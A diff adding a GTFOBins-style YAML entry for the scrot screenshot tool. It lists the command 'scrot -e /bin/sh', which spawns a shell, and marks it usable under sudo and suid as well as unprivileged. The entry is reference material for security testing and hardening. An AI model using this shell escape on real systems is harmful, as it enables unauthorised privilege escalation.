@@ -1,0 +1,13 @@
+---
+comment: |-
+  This requires a running X server.
+functions:
+  shell:
+  - code: |-
+      scrot -e /bin/sh
+    contexts:
+      sudo:
+      suid:
+        shell: true
+      unprivileged:
+...
